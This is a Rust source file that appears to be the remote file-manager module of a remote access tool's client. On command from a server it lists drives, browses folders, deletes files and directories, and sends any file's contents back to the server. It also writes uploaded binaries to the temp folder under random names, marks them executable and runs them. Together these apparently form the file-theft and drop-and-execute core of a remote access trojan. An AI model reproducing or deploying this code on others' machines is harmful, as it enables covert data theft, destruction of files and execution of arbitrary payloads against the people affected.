use std::path::PathBuf;

use common::packets::{ File, FileData, ServerboundPacket };
use crate::handler::send_packet;

pub struct FileManager {
    pub current_path: PathBuf,
}

impl Default for FileManager {
    fn default() -> Self {
        Self::new()
    }
}

impl FileManager {
    pub fn new() -> Self {
        Self {
            current_path: PathBuf::new(),
        }
    }

    pub async fn list_available_disks(&mut self) {
        let _ = send_packet(ServerboundPacket::DisksResult(get_available_disks())).await;
    }

    pub async fn write_current_folder(&mut self) {
        let _ = send_packet(
            ServerboundPacket::CurrentFolder(self.current_path.to_string_lossy().to_string()),
        ).await;
    }

    pub async fn view_folder(
        &mut self,
        folder: &str,
    ) {
        let new_path = self.current_path.join(folder);
        if new_path.exists() && new_path.is_dir() && new_path.read_dir().is_ok() {
            self.current_path = new_path;
            self.list_directory_contents().await;
            self.write_current_folder().await;
        } else {
            eprintln!("Cannot access directory: {}", new_path.display());
            // Send empty file list to indicate error
            let _ = send_packet(ServerboundPacket::FileList(Vec::new())).await;
            // Reset current path to root
            let _ = send_packet(ServerboundPacket::CurrentFolder("".to_string())).await;
        }
    }

    pub async fn navigate_to_parent(&mut self) {
        if let Some(parent) = self.current_path.parent() {
            self.current_path = parent.to_path_buf();
            self.list_directory_contents().await;
        } else {
            self.list_available_disks().await;
        }
        self.write_current_folder().await;
    }

    pub async fn remove_directory(
        &mut self,
        directory: &str,
    ) {
        let dir_path = self.current_path.join(directory);
        if std::fs::remove_dir_all(dir_path).is_ok() {
            self.list_directory_contents().await;
        }
    }

    pub async fn remove_file(
        &mut self,
        file: &str,
    ) {
        let file_path = self.current_path.join(file);
        if std::fs::remove_file(file_path).is_ok() {
            self.list_directory_contents().await;
        }
    }

    pub async fn list_directory_contents(&self) {
        if let Ok(entries) = self.current_path.read_dir() {
            let mut file_entries: Vec<File> = Vec::new();
            for entry in entries.filter_map(Result::ok) {
                match entry.file_type() {
                    Ok(file_type) => {
                        let name = entry.file_name().to_string_lossy().to_string();
                        if file_type.is_dir() {
                            file_entries.push(File {
                                file_type: "dir".to_string(),
                                name: name.clone(),
                            });
                        } else if file_type.is_file() {
                            file_entries.push(File {
                                file_type: "file".to_string(),
                                name: name.clone(),
                            });
                        }
                    }
                    Err(e) => {
                        eprintln!("Failed to read file type: {}", e);
                    }
                }
            }
            let _ = send_packet(ServerboundPacket::FileList(file_entries)).await;
        } else {
            eprintln!("Could not read directory: {}", self.current_path.display());
            // Send empty file list to indicate error
            let _ = send_packet(ServerboundPacket::FileList(Vec::new())).await;
            // Reset current path to root
            let _ = send_packet(ServerboundPacket::CurrentFolder("".to_string())).await;
        }
    }

    pub async fn download_file(
        &self,
        filename: &str,
    ) {
        let file_path = self.current_path.join(filename);
        if let Ok(data) = std::fs::read(&file_path) {
            let _ = send_packet(ServerboundPacket::DonwloadFileResult(FileData { name: filename.to_string(), data })).await;
        } else {
            eprintln!("Failed to read file: {}", file_path.display());
        }
    }

    pub async fn upload_and_execute(&self, file_data: FileData) {
        let temp_dir = std::env::temp_dir();
        
        let random_num: u64 = rand::random();
        let (random_name, _extension) = get_executable_name(random_num);
        
        let file_path = temp_dir.join(random_name);
        
        if let Err(e) = std::fs::write(&file_path, &file_data.data) {
            eprintln!("Failed to write file to temp directory: {}", e);
            return;
        }
        
        // Make file executable on Unix systems
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if let Ok(mut perms) = std::fs::metadata(&file_path).map(|m| m.permissions()) {
                perms.set_mode(0o755);
                let _ = std::fs::set_permissions(&file_path, perms);
            }
        }
        
        self.execute_file(&file_path.to_string_lossy()).await;
    }
    
    pub async fn execute_file(&self, path: &str) {
        platform_execute_file(path).await;
    }
    
    pub async fn upload_file(&self, target_folder: String, file_data: FileData) {
        let path = std::path::Path::new(&target_folder);
        let file_path = path.join(&file_data.name);
        
        if let Err(e) = std::fs::write(&file_path, &file_data.data) {
            eprintln!("Failed to write file to folder: {}", e);
            return;
        }

        if let Some(parent) = file_path.parent() {
            if parent.to_string_lossy() == self.current_path.to_string_lossy() {
                self.list_directory_contents().await;
            }
        }
    }
}

// Platform-specific implementations
#[cfg(windows)]
fn get_available_disks() -> Vec<String> {
    let arr = [
        "A",
        "B",
        "C",
        "D",
        "E",
        "F",
        "G",
        "H",
        "I",
        "J",
        "K",
        "L",
        "M",
        "N",
        "O",
        "P",
        "Q",
        "R",
        "S",
        "T",
        "U",
        "V",
        "W",
        "X",
        "Y",
        "Z",
    ];
    let mut available: Vec<String> = Vec::new();
    for dr in arr {
        let str = format!("{}:\\", dr);
        if std::path::Path::new(str.as_str()).read_dir().is_ok() {
            let _ = &available.push(dr.to_string());
        }
    }

    available
}

#[cfg(unix)]
fn get_available_disks() -> Vec<String> {
    let mut available: Vec<String> = Vec::new();
    
    // Add root filesystem
    available.push("/".to_string());
    
    // Common mount points to check
    let common_mounts = [
        "/home",
        "/usr",
        "/var",
        "/tmp",
        "/opt",
        "/boot",
        "/mnt",
        "/media",
    ];
    
    for mount in &common_mounts {
        if std::path::Path::new(mount).exists() && std::path::Path::new(mount).is_dir() {
            available.push(mount.to_string());
        }
    }
    
    // Try to read /proc/mounts to get actual mounted filesystems
    if let Ok(mounts_content) = std::fs::read_to_string("/proc/mounts") {
        for line in mounts_content.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let mount_point = parts[1];
                // Skip special filesystems and duplicates
                if !mount_point.starts_with("/proc") 
                    && !mount_point.starts_with("/sys") 
                    && !mount_point.starts_with("/dev") 
                    && !mount_point.starts_with("/run")
                    && mount_point != "/"
                    && !available.contains(&mount_point.to_string())
                    && std::path::Path::new(mount_point).is_dir() {
                    available.push(mount_point.to_string());
                }
            }
        }
    }
    
    available
}

#[cfg(windows)]
fn get_executable_name(random_num: u64) -> (String, &'static str) {
    (format!("file_{}.exe", random_num), ".exe")
}

#[cfg(unix)]
fn get_executable_name(random_num: u64) -> (String, &'static str) {
    (format!("file_{}", random_num), "")
}

#[cfg(windows)]
async fn platform_execute_file(path: &str) {
    match std::process::Command::new("cmd.exe")
        .args(["/c", "start", "", path])
        .spawn() 
    {
        Ok(_) => println!("Successfully executed file: {}", path),
        Err(e) => eprintln!("Failed to execute file: {}", e),
    }
}

#[cfg(unix)]
async fn platform_execute_file(path: &str) {
    // Normalize path separators and ensure proper formatting
    let path = path.replace('\\', "/");
    
    // Ensure path starts with "/" and has proper separators
    let path = if path.starts_with('/') {
        path.to_string()
    } else {
        format!("/{}", path)
    };

    // Try to open with xdg-open first (most Linux distributions)
    match std::process::Command::new("xdg-open")
        .arg(&path)
        .spawn() 
    {
        Ok(_) => println!("Successfully opened file: {}", path),
        Err(e) => {
            eprintln!("Failed to open with xdg-open: {}", e);
            // Try with gio-open (GNOME)
            match std::process::Command::new("gio")
                .args(["open", &path])
                .spawn() 
            {
                Ok(_) => println!("Successfully opened file with gio: {}", path),
                Err(e2) => {
                    eprintln!("Failed to open with gio: {}", e2);
                    // Try with gnome-open (older GNOME)
                    match std::process::Command::new("gnome-open")
                        .arg(&path)
                        .spawn() 
                    {
                        Ok(_) => println!("Successfully opened file with gnome-open: {}", path),
                        Err(e3) => eprintln!("Failed to open file with any method: {}", e3),
                    }
                }
            }
        }
    }
}